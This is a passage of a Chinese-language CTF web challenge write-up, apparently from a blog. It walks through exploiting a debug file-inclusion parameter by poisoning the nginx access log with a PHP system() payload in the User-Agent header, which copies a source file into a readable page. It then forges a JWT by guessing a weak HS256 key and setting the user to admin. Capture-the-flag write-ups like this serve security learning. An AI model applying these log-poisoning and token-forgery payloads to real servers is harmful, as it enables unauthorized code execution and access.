<p>我们传一个file参数给它，我们访问：</p>
<pre><code class="hljs plaintext">题目链接/debug/?file=/var/www/html/clear.php</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/b9ad53ae71b6745d204f918d9def3a4b.png?x-oss-process=hzy" alt="image-20220406185228841"></p>
<p>发现它执行了clear.php文件，那我们可以通过在日志中传入木马来实现任意文件访问：</p>
<pre><code class="hljs plaintext">题目链接/debug/?file=/var/log/nginx/access.log</code></pre>
<p>若在网站根目录写入2.html会重定向，我们可以将2.html写入/alsckdfy/目录下即可正常访问。</p>
<p>payload：</p>
<pre><code class="hljs php">User-Agent : <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /var/www/html/alsckdfy/check.php &gt; /var/www/html/alsckdfy/1.html&#x27;</span>);<span class="hljs-meta">?&gt;</span></code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/8e62e4d61edada04844a68876a617b2f.png?x-oss-process=hzy" alt="image-20220406185342877"></p>
<p>访问1.html查看源代码即可看到flag。</p>
<h1 id="web389">web389</h1>
<pre><code class="hljs plaintext">debug/?file=/var/www/html/index.php</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/e869afba6a604fc1e85f6465e958e8b7.png?x-oss-process=hzy" alt="image-20220406185814482"></p>
<p>查看cookie，发现auth的值为jwt，放到<code>jwt.io</code>里解码，发现alg为HS256。我们盲猜一波key为123456。把header里的user改为admin，再次执行debug，提示：“已写入日志“</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/a4ad34fb25984093a42d5dd47088e0f2.png?x-oss-process=hzy" alt="image-20220406190027879"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>黑盒测试</tag>
      </tags>
  </entry>
</search>
